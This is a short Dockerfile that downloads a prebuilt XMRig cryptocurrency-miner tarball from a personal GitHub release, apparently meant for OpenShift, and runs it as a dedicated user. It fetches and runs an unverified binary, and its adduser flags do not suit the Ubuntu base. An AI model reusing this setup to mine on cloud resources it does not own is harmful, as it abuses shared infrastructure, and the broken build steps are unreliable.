FROM  ubuntu
RUN adduser -S -D -H -h /xmrig-2.6.2 xminer
RUN apt-get update && apt-get install -y wget
RUN wget https://github.com/lanka256/openshif-docker/releases/download/1.0/xmrig001.tar.gz
RUN tar -xvzf xmrig001.tar.gz
WORKDIR xmrig-2.6.2/
USER xminer
WORKDIR xmrig-2.6.2/
CMD ./xmrig
